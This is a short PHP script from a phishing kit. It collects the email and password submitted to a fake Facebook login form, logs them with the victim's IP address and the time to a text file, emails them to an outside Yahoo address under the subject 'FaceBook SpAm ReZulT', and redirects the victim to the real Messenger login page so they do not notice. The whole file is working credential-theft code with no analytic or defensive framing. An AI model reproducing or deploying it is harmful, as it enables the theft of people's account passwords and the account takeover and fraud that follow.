<?php


$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "xxxxxxxxxxxxxxxx+ General +xxxxxxxxxxxxxxxx\n";
$message .= "user: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['pass']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "scamrez@yahoo.com";
$subject = "FaceBook SpAm ReZulT | $ip";
$headers = "From: FaceBook SpAm ReZulT";
$file = fopen("log.txt","ab");
fwrite($file,$message);
fclose($file);
mail($send,$subject,$rnessage,$headers);

header("Location: https://www.messenger.com/login");


?>